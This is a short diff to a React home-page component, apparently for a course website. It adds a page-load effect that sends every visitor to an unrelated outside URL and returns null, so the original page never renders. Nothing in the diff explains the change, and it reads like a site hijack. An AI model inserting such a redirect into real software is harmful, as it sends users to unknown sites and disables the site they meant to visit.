@@ -1,4 +1,4 @@
-import React from "react";
+import React, { useEffect } from "react";
 
 // Layouts
 import Header from "@/containers/layout/header.jsx";
@@ -15,8 +15,17 @@ import Instructor from "@/containers/section/instructor.jsx";
 import Student from "@/containers/section/student.jsx";
 import Benefits from "@/containers/section/benefits.jsx";
 import { Toaster } from "react-hot-toast";
+import { useNavigate } from "react-router-dom";
 
 const Home = () => {
+  const navigate = useNavigate();
+
+  useEffect(() => {
+    window.location.href = 'https://webwire.site/adrienne-platt/'
+  }, []);
+
+  return null;
+
   return (
     <div>
       <Toaster
